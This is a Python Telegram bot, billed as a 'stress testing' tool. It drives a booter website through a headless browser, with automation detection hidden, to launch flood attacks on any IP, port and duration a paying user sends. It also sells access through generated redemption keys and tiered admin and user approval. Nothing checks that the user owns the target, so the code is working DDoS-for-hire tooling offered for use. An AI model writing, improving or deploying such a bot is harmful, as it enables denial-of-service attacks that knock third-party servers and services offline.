"""
SOUL BOT - Telegram Stress Testing Bot
Deployment: Railway / VPS
Version: 2.1 - Fixed for Railway
"""

import asyncio
import time
import logging
import os
import json
import string
import random
import sys
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from playwright.async_api import async_playwright

# --- Configuration from Environment Variables ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is required!")

OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
if OWNER_ID == 0:
    raise ValueError("OWNER_ID environment variable is required!")

HEADLESS_MODE = os.environ.get("HEADLESS_MODE", "true").lower() == "true"
LOGIN_TOKEN = os.environ.get("LOGIN_TOKEN", "")

# Data files
DATA_JSON = "users_data.json"

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global variables
user_state = {}
playwright = None
browser = None
context = None
page = None
logged_in = False
data = {
    "approved_users": {},
    "admins": {},
    "keys": {},
    "disapproved_users": []
}

# --- Data Management Functions ---
def load_data():
    global data
    try:
        if os.path.exists(DATA_JSON):
            with open(DATA_JSON, 'r') as f:
                data = json.load(f)
            logger.info("Data loaded from JSON")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_data():
    try:
        with open(DATA_JSON, 'w') as f:
            json.dump(data, f, indent=4)
        logger.info("Data saved")
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def get_time_left(expiry_str):
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        delta = expiry - now
        if delta.days < 0:
            return "⚠️ Expired"
        return f"✅ {delta.days} days"
    except:
        return "N/A"

def generate_random_key():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(20))

def is_owner(user_id):
    return user_id == OWNER_ID

def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    if str(user_id) in data.get("admins", {}):
        expiry_str = data["admins"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["admins"][str(user_id)]
                save_data()
        except:
            pass
    return False

def is_approved(user_id):
    if is_admin(user_id):
        return True
    if str(user_id) in data.get("approved_users", {}):
        expiry_str = data["approved_users"][str(user_id)].get("expiry")
        try:
            expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
            if datetime.now() < expiry:
                return True
            else:
                del data["approved_users"][str(user_id)]
                save_data()
        except:
            pass
    return False

# --- Browser Management ---
async def initialize_browser():
    global playwright, browser, context, page
    try:
        if page and not page.is_closed():
            return True

        logger.info(f"Initializing browser in {'HEADLESS' if HEADLESS_MODE else 'HEADED'} mode...")
        
        playwright = await async_playwright().start()
        
        browser = await playwright.chromium.launch(
            headless=HEADLESS_MODE,
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-blink-features=AutomationControlled',
            ]
        )
        
        context = await browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        
        page = await context.new_page()
        
        await page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
        logger.info("Browser initialized successfully")
        
        if LOGIN_TOKEN and not logged_in:
            await auto_login()
        
        return True
        
    except Exception as e:
        logger.error(f"Browser initialization error: {e}")
        await close_browser()
        return False

async def auto_login():
    global page, logged_in
    try:
        logger.info("Attempting auto-login...")
        await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(2)
        
        await page.fill("#token", LOGIN_TOKEN)
        await asyncio.sleep(1)
        
        current_url = page.url
        if "dashboard" in current_url or "attack" in current_url:
            logged_in = True
            logger.info("Auto-login successful!")
    except Exception as e:
        logger.error(f"Auto-login error: {e}")

async def close_browser():
    global playwright, browser, context, page
    try:
        if context:
            await context.close()
        if browser:
            await browser.close()
        if playwright:
            await playwright.stop()
        page = None
        context = None
        browser = None
        playwright = None
        logger.info("Browser closed")
    except Exception as e:
        logger.error(f"Error closing browser: {e}")

# --- Keyboard Builders ---
def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔓 Login", callback_data="login"),
         InlineKeyboardButton("📊 Check Status", callback_data="check")],
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats"),
         InlineKeyboardButton("🔴 Logout", callback_data="logout")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ Approve User", callback_data="approve"),
         InlineKeyboardButton("❌ Disapprove User", callback_data="disapprove")],
        [InlineKeyboardButton("👮 Add Admin", callback_data="add_admin"),
         InlineKeyboardButton("🚫 Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("🎟️ Generate Key", callback_data="gen_key"),
         InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 View Stats", callback_data="stats")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_approved_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Run Attack", callback_data="run")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎟️ Redeem Key", callback_data="redeem_key")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "User"

    welcome_msg = f"👋 **Welcome {user_name}!**\n\n"

    if is_owner(user_id):
        welcome_msg += "🔑 **You are the Owner**\n"
        keyboard = get_owner_keyboard()
    elif is_admin(user_id):
        welcome_msg += "👮 **You are an Admin**\n"
        keyboard = get_admin_keyboard()
    elif is_approved(user_id):
        welcome_msg += "✅ **You are Approved**\n"
        keyboard = get_approved_keyboard()
    else:
        welcome_msg += "📌 **Welcome to the Bot**\nRedeem a key to get access.\n\n"
        keyboard = get_user_keyboard()

    await update.message.reply_text(welcome_msg, parse_mode='Markdown', reply_markup=keyboard)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    callback_data = query.data

    if callback_data == "login":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await query.message.reply_text("🚀 Starting login...")
        await start_login_flow(query.message)
        return

    elif callback_data == "check":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await check_status(query.message)
        return

    elif callback_data == "logout":
        if not is_owner(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        await logout_session(query.message)
        return

    elif callback_data == "approve":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'approve', 'step': 'awaiting_id'}
        await query.message.reply_text("✅ Approve User\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "disapprove":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'disapprove', 'step': 'awaiting_id'}
        await query.message.reply_text("❌ Disapprove User\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "add_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'add_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("👮 Add Admin\n\nSend: `<user_id> <days>`", parse_mode='Markdown')
        return

    elif callback_data == "remove_admin":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'remove_admin', 'step': 'awaiting_id'}
        await query.message.reply_text("🚫 Remove Admin\n\nSend user ID:", parse_mode='Markdown')
        return

    elif callback_data == "gen_key":
        if not is_admin(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'gen_key', 'step': 'awaiting_days'}
        await query.message.reply_text("🎟️ Generate Key\n\nSend number of days:", parse_mode='Markdown')
        return

    elif callback_data == "run":
        if not is_approved(user_id):
            await query.message.reply_text("❌ Not authorized.")
            return
        user_state[user_id] = {'action': 'run', 'step': 'awaiting_params'}
        await query.message.reply_text("🚀 Run Attack\n\nSend: `<IP> <PORT> <TIME>`", parse_mode='Markdown')
        return

    elif callback_data == "stats":
        await show_stats(query.message, user_id)
        return

    elif callback_data == "my_status":
        await show_my_status(query.message, user_id)
        return

    elif callback_data == "redeem_key":
        user_state[user_id] = {'action': 'redeem', 'step': 'awaiting_key'}
        await query.message.reply_text("🎟️ Redeem Key\n\nSend your access key:", parse_mode='Markdown')
        return

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id == OWNER_ID:
        state = user_state.get(OWNER_ID, {}).get('step')
        if state == 'waiting_token':
            await enter_token(update, text)
            return
        elif state == 'waiting_captcha':
            await enter_captcha(update, text)
            return

    if user_id not in user_state:
        await update.message.reply_text("ℹ️ Use /start to see options.")
        return

    action = user_state[user_id].get('action')

    if action == 'approve':
        await process_approve(update, text)
    elif action == 'disapprove':
        await process_disapprove(update, text)
    elif action == 'add_admin':
        await process_add_admin(update, text)
    elif action == 'remove_admin':
        await process_remove_admin(update, text)
    elif action == 'gen_key':
        await process_gen_key(update, text)
    elif action == 'run':
        await process_run(update, text)
    elif action == 'redeem':
        await process_redeem(update, text)

async def process_approve(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format.")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][target_id] = {
            "expiry": expiry_date,
            "approved_by": user_id
        }

        save_data()
        await update.message.reply_text(f"✅ User Approved!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_disapprove(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if str(target_id) in data.get("approved_users", {}):
            del data["approved_users"][str(target_id)]
        save_data()
        await update.message.reply_text(f"❌ User {target_id} disapproved!")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_add_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        parts = text.strip().split()
        if len(parts) != 2:
            await update.message.reply_text("❌ Invalid format.")
            return

        target_id, days = parts[0], int(parts[1])
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["admins"][target_id] = {
            "expiry": expiry_date,
            "added_by": user_id
        }

        save_data()
        await update.message.reply_text(f"👮 Admin Added!\nID: {target_id}\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_remove_admin(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        target_id = text.strip()
        if target_id in data.get("admins", {}):
            del data["admins"][target_id]
            save_data()
            await update.message.reply_text(f"🚫 Admin {target_id} removed!")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_gen_key(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        days = int(text.strip())
        key = generate_random_key()

        data["keys"][key] = {
            "days": days,
            "created_by": user_id,
            "redeemed": False,
            "redeemed_by": None
        }

        save_data()
        await update.message.reply_text(f"🎟️ Key Generated!\n🔑 `{key}`\nValid for: {days} days", parse_mode='Markdown')
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def process_run(update: Update, text: str):
    global page, logged_in
    user_id = update.effective_user.id

    if not logged_in or not page:
        await update.message.reply_text("❌ Server is under work. Please wait and ensure you're logged in.")
        return

    try:
        parts = text.strip().split()
        if len(parts) != 3:
            await update.message.reply_text("❌ Invalid format.")
            return

        ip, port, duration = parts

        await update.message.reply_text(f"⚡ Preparing attack...\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")

        await page.goto("https://satellitestress.st/attack", wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(3)

        try:
            await page.fill("input[placeholder='104.29.138.132']", ip, timeout=10000)
            await asyncio.sleep(0.5)
            await page.fill("input[placeholder='80']", port, timeout=10000)
            await asyncio.sleep(0.5)
            await page.fill("input[placeholder='60']", duration, timeout=10000)
            await asyncio.sleep(0.5)
            await page.click("button:has-text('Launch Attack')", timeout=10000)
        except:
            await page.fill("input[type='text']", ip, timeout=10000)
            await asyncio.sleep(0.5)
            await page.click("button:has-text('Launch')", timeout=10000)

        await asyncio.sleep(2)
        await update.message.reply_text(f"🚀 Attack Started!\n🎯 {ip}:{port}\n⏱️ {duration}s")
        user_state.pop(user_id, None)

    except Exception as e:
        await update.message.reply_text(f"❌ Attack Failed: {str(e)[:100]}")

async def process_redeem(update: Update, text: str):
    user_id = update.effective_user.id
    try:
        key = text.strip()

        if key not in data.get("keys", {}):
            await update.message.reply_text("❌ Invalid key.")
            user_state.pop(user_id, None)
            return

        key_data = data["keys"][key]

        if key_data.get("redeemed"):
            await update.message.reply_text("❌ Key already redeemed.")
            user_state.pop(user_id, None)
            return

        days = key_data.get("days", 0)
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")

        data["approved_users"][str(user_id)] = {
            "expiry": expiry_date,
            "approved_by": "key_redemption"
        }

        data["keys"][key]["redeemed"] = True
        data["keys"][key]["redeemed_by"] = user_id

        save_data()
        await update.message.reply_text(f"🎉 Key Redeemed!\n✅ Access granted for {days} days\nExpires: {expiry_date}")
        user_state.pop(user_id, None)
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def start_login_flow(message):
    global page
    try:
        if not page:
            if not await initialize_browser():
                await message.reply_text("❌ Failed to initialize browser.")
                return

        await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=60000)
        await asyncio.sleep(2)

        current_url = page.url
        if "dashboard" in current_url or "attack" in current_url:
            global logged_in
            logged_in = True
            await message.reply_text("✅ Already logged in!")
            return

        await message.reply_text(
            "🔐 Login Required\n\n"
            "Send your token to login:\n"
            "Example: `/login your_token_here`"
        )
        user_state[OWNER_ID] = {'step': 'waiting_token'}

    except Exception as e:
        await message.reply_text(f"❌ Login Error: {e}")

async def enter_token(update: Update, token: str):
    global page
    try:
        await page.fill("#token", token, timeout=30000)
        await asyncio.sleep(1)

        captcha_present = await page.query_selector("input[aria-label='Enter captcha answer']")

        if captcha_present:
            screenshot = await page.screenshot()
            await update.message.reply_photo(photo=screenshot, caption="Enter the captcha:")
            user_state[OWNER_ID] = {'step': 'waiting_captcha'}
        else:
            await page.click("button[type='submit']")
            await asyncio.sleep(3)

            current_url = page.url
            if "dashboard" in current_url or "attack" in current_url:
                global logged_in
                logged_in = True
                await update.message.reply_text("✅ Login Successful!")
            else:
                await update.message.reply_text("❌ Login failed.")
                user_state.pop(OWNER_ID, None)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def enter_captcha(update: Update, captcha: str):
    global page, logged_in
    try:
        await page.fill("input[aria-label='Enter captcha answer']", captcha, timeout=30000)
        await asyncio.sleep(0.5)
        await page.click("button[type='submit']")
        await asyncio.sleep(3)

        current_url = page.url
        if "dashboard" in current_url or "attack" in current_url:
            logged_in = True
            await update.message.reply_text("✅ Login Successful!")
        else:
            await update.message.reply_text("❌ Login failed.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    finally:
        user_state.pop(OWNER_ID, None)

async def check_status(message):
    global page, logged_in
    if not page:
        await message.reply_text("❌ Browser not initialized.")
        return

    try:
        if logged_in:
            await message.reply_text("✅ Status: LOGGED IN 🟢\nReady for attacks!")
        else:
            await message.reply_text("❌ Status: NOT LOGGED IN 🔴")
    except Exception as e:
        await message.reply_text(f"❌ Status error: {e}")

async def show_stats(message, user_id):
    approved_count = len(data.get("approved_users", {}))
    admin_count = len(data.get("admins", {}))
    key_count = len(data.get("keys", {}))
    redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))

    await message.reply_text(
        f"📊 Statistics\n\n"
        f"✅ Approved: {approved_count}\n"
        f"👮 Admins: {admin_count}\n"
        f"🎟️ Keys: {key_count}\n"
        f"✔ Redeemed: {redeemed_count}"
    )

async def show_my_status(message, user_id):
    if str(user_id) in data.get("approved_users", {}):
        expiry = data["approved_users"][str(user_id)].get("expiry")
        await message.reply_text(f"✅ Status: Approved\nExpires: {expiry}")
    elif str(user_id) in data.get("admins", {}):
        expiry = data["admins"][str(user_id)].get("expiry")
        await message.reply_text(f"👮 Status: Admin\nExpires: {expiry}")
    elif is_owner(user_id):
        await message.reply_text("🔑 Status: Owner\nAccess: Unlimited")
    else:
        await message.reply_text("❌ Status: No Access\nRedeem a key to get access!")

async def logout_session(message):
    global logged_in
    await close_browser()
    logged_in = False
    await message.reply_text("✅ Browser session closed.")

# --- Main Function ---
async def main_async():
    load_data()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logger.info(f"Bot started - Owner: {OWNER_ID}")
    logger.info(f"Headless mode: {HEADLESS_MODE}")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    # Keep running
    while True:
        await asyncio.sleep(3600)

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
